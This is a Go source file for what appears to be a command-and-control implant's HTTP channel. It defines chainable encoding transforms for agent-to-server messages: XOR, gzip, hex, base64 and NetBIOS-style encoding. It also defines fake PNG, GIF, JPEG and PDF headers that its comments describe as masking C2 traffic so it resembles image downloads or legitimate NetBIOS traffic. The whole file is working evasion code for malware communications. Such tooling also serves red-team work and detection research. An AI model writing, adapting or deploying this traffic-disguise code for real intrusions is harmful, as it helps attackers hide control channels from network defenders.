package http

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"strings"
)

// Transform represents a single reversible data transformation step.
// Transforms are applied to the base64-encoded agent message before sending
// and reversed on the response before base64 decoding.
type Transform interface {
	// Encode transforms outgoing data (agent → server)
	Encode(data []byte) ([]byte, error)
	// Decode reverses the transformation on incoming data (server → agent)
	Decode(data []byte) ([]byte, error)
}

// TransformChain applies multiple transforms in sequence.
// Encode applies transforms in order: t1 → t2 → t3.
// Decode applies in reverse: t3 → t2 → t1.
type TransformChain struct {
	transforms []Transform
}

// NewTransformChain creates a TransformChain from a list of transforms.
func NewTransformChain(transforms ...Transform) *TransformChain {
	return &TransformChain{transforms: transforms}
}

// Encode applies all transforms in order.
func (tc *TransformChain) Encode(data []byte) ([]byte, error) {
	if tc == nil || len(tc.transforms) == 0 {
		return data, nil
	}
	var err error
	for _, t := range tc.transforms {
		data, err = t.Encode(data)
		if err != nil {
			return nil, err
		}
	}
	return data, nil
}

// Decode applies all transforms in reverse order.
func (tc *TransformChain) Decode(data []byte) ([]byte, error) {
	if tc == nil || len(tc.transforms) == 0 {
		return data, nil
	}
	var err error
	for i := len(tc.transforms) - 1; i >= 0; i-- {
		data, err = tc.transforms[i].Decode(data)
		if err != nil {
			return nil, err
		}
	}
	return data, nil
}

// --- Built-in Transforms ---

// Base64Transform re-encodes data in base64 (produces double-encoding when
// applied after the default base64 step).
type Base64Transform struct{}

func (t *Base64Transform) Encode(data []byte) ([]byte, error) {
	encoded := base64.StdEncoding.EncodeToString(data)
	return []byte(encoded), nil
}

func (t *Base64Transform) Decode(data []byte) ([]byte, error) {
	return base64.StdEncoding.DecodeString(string(data))
}

// HexTransform converts data to/from hex encoding.
type HexTransform struct{}

func (t *HexTransform) Encode(data []byte) ([]byte, error) {
	encoded := hex.EncodeToString(data)
	return []byte(encoded), nil
}

func (t *HexTransform) Decode(data []byte) ([]byte, error) {
	return hex.DecodeString(string(data))
}

// PrependTransform prepends fixed bytes to the data.
// Useful for adding magic bytes (e.g., GIF89a, PNG header).
type PrependTransform struct {
	Prefix []byte
}

func (t *PrependTransform) Encode(data []byte) ([]byte, error) {
	return append(append([]byte(nil), t.Prefix...), data...), nil
}

func (t *PrependTransform) Decode(data []byte) ([]byte, error) {
	if len(data) < len(t.Prefix) {
		return nil, fmt.Errorf("data too short for prepend transform strip")
	}
	return data[len(t.Prefix):], nil
}

// AppendTransform appends fixed bytes to the data.
// Useful for adding trailers or padding markers.
type AppendTransform struct {
	Suffix []byte
}

func (t *AppendTransform) Encode(data []byte) ([]byte, error) {
	return append(append([]byte(nil), data...), t.Suffix...), nil
}

func (t *AppendTransform) Decode(data []byte) ([]byte, error) {
	if len(data) < len(t.Suffix) {
		return nil, fmt.Errorf("data too short for append transform strip")
	}
	return data[:len(data)-len(t.Suffix)], nil
}

// XORTransform applies repeating XOR with a key.
type XORTransform struct {
	Key []byte
}

func (t *XORTransform) Encode(data []byte) ([]byte, error) {
	if len(t.Key) == 0 {
		return data, nil
	}
	result := make([]byte, len(data))
	for i := range data {
		result[i] = data[i] ^ t.Key[i%len(t.Key)]
	}
	return result, nil
}

func (t *XORTransform) Decode(data []byte) ([]byte, error) {
	// XOR is its own inverse
	return t.Encode(data)
}

// GzipTransform compresses/decompresses data with gzip.
type GzipTransform struct{}

func (t *GzipTransform) Encode(data []byte) ([]byte, error) {
	var buf bytes.Buffer
	w := gzip.NewWriter(&buf)
	if _, err := w.Write(data); err != nil {
		return nil, fmt.Errorf("gzip write: %w", err)
	}
	if err := w.Close(); err != nil {
		return nil, fmt.Errorf("gzip close: %w", err)
	}
	return buf.Bytes(), nil
}

func (t *GzipTransform) Decode(data []byte) ([]byte, error) {
	r, err := gzip.NewReader(bytes.NewReader(data))
	if err != nil {
		return nil, fmt.Errorf("gzip reader: %w", err)
	}
	defer r.Close()
	return io.ReadAll(r)
}

// MaskTransform prepends a fake file header so traffic looks like an image
// download or other benign file type. Supported types: png, gif, jpeg, pdf.
type MaskTransform struct {
	Header []byte // magic bytes prepended
	Footer []byte // optional IEND/trailer appended
}

// Common file magic bytes for masking C2 traffic.
var fileMasks = map[string]*MaskTransform{
	"png": {
		Header: []byte{0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, // PNG signature
			0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52, // IHDR chunk
			0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, // 1x1 pixel
			0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53, 0xDE}, // RGB, CRC
		Footer: []byte{0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4E, 0x44, // IEND
			0xAE, 0x42, 0x60, 0x82},
	},
	"gif": {
		Header: []byte("GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00"),
		Footer: []byte{0x3B}, // GIF trailer
	},
	"jpeg": {
		Header: []byte{0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00},
		Footer: []byte{0xFF, 0xD9}, // JPEG EOI marker
	},
	"pdf": {
		Header: []byte("%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj 2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj 3 0 obj<</Type/Page/MediaBox[0 0 1 1]/Parent 2 0 R>>endobj\nstream\n"),
		Footer: []byte("\nendstream\nendobj\n%%EOF"),
	},
}

func (t *MaskTransform) Encode(data []byte) ([]byte, error) {
	result := make([]byte, 0, len(t.Header)+len(data)+len(t.Footer))
	result = append(result, t.Header...)
	result = append(result, data...)
	result = append(result, t.Footer...)
	return result, nil
}

func (t *MaskTransform) Decode(data []byte) ([]byte, error) {
	if len(data) < len(t.Header)+len(t.Footer) {
		return nil, fmt.Errorf("data too short for mask transform strip")
	}
	return data[len(t.Header) : len(data)-len(t.Footer)], nil
}

// NetBIOSTransform uses NetBIOS-style encoding where each byte becomes two
// uppercase letters (A-P). This makes binary data look like hostname strings,
// blending with legitimate NetBIOS traffic.
type NetBIOSTransform struct{}

func (t *NetBIOSTransform) Encode(data []byte) ([]byte, error) {
	result := make([]byte, len(data)*2)
	for i, b := range data {
		result[i*2] = 'A' + (b >> 4)
		result[i*2+1] = 'A' + (b & 0x0F)
	}
	return result, nil
}

func (t *NetBIOSTransform) Decode(data []byte) ([]byte, error) {
	if len(data)%2 != 0 {
		return nil, fmt.Errorf("netbios decode: odd length %d", len(data))
	}
	result := make([]byte, len(data)/2)
	for i := 0; i < len(data); i += 2 {
		hi := data[i] - 'A'
		lo := data[i+1] - 'A'
		if hi > 15 || lo > 15 {
			return nil, fmt.Errorf("netbios decode: invalid byte pair at %d", i)
		}
		result[i/2] = (hi << 4) | lo
	}
	return result, nil
}

// ParseTransformChain parses a comma-separated transform specification string
// into a TransformChain. Format: "transform1,transform2:arg,transform3:arg"
//
// Supported transforms:
//   - base64          — double base64 encoding
//   - hex             — hex encoding
//   - prepend:<hex>   — prepend hex-encoded bytes
//   - append:<hex>    — append hex-encoded bytes
//   - xor:<hex>       — XOR with hex-encoded key
//   - gzip            — gzip compression
//   - mask:<type>     — fake file header (png, gif, jpeg, pdf)
//   - netbios         — NetBIOS-style byte encoding
func ParseTransformChain(spec string) (*TransformChain, error) {
	spec = strings.TrimSpace(spec)
	if spec == "" {
		return nil, nil
	}

	parts := strings.Split(spec, ",")
	transforms := make([]Transform, 0, len(parts))

	for _, part := range parts {
		part = strings.TrimSpace(part)
		if part == "" {
			continue
		}

		name, arg, _ := strings.Cut(part, ":")
		name = strings.ToLower(name)

		switch name {
		case "base64":
			transforms = append(transforms, &Base64Transform{})

		case "hex":
			transforms = append(transforms, &HexTransform{})

		case "prepend":
			if arg == "" {
				return nil, fmt.Errorf("prepend transform requires hex argument")
			}
			prefix, err := hex.DecodeString(arg)
			if err != nil {
				return nil, fmt.Errorf("prepend: invalid hex %q: %w", arg, err)
			}
			transforms = append(transforms, &PrependTransform{Prefix: prefix})

		case "append":
			if arg == "" {
				return nil, fmt.Errorf("append transform requires hex argument")
			}
			suffix, err := hex.DecodeString(arg)
			if err != nil {
				return nil, fmt.Errorf("append: invalid hex %q: %w", arg, err)
			}
			transforms = append(transforms, &AppendTransform{Suffix: suffix})

		case "xor":
			if arg == "" {
				return nil, fmt.Errorf("xor transform requires hex key argument")
			}
			key, err := hex.DecodeString(arg)
			if err != nil {
				return nil, fmt.Errorf("xor: invalid hex key %q: %w", arg, err)
			}
			transforms = append(transforms, &XORTransform{Key: key})

		case "gzip":
			transforms = append(transforms, &GzipTransform{})

		case "mask":
			mask, ok := fileMasks[strings.ToLower(arg)]
			if !ok {
				return nil, fmt.Errorf("mask: unknown type %q (supported: png, gif, jpeg, pdf)", arg)
			}
			transforms = append(transforms, mask)

		case "netbios":
			transforms = append(transforms, &NetBIOSTransform{})

		default:
			return nil, fmt.Errorf("unknown transform: %q", name)
		}
	}

	if len(transforms) == 0 {
		return nil, nil
	}
	return NewTransformChain(transforms...), nil
}
